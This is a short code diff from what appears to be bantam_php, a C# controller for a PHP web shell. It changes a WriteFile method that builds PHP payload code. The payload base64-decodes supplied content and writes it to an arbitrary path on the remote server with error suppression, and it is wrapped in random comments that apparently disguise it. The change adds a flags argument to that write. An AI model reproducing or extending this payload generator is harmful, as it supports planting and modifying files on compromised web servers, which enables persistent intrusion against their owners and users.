@@ -382,10 +382,10 @@ namespace bantam_php
         /// <param name="remoteFileLocation"></param>
         /// <param name="b64FileContents"></param>
         /// <returns></returns>
-        public static string WriteFile(string remoteFileLocation, string b64FileContents)
+        public static string WriteFile(string remoteFileLocation, string b64FileContents, string flags = "0")
         {
             string phpCode = RandomPHPComment()
-                           + "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'));"
+                           + "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'), " + flags + ");"
                            + RandomPHPComment();
             return phpCode;
         }
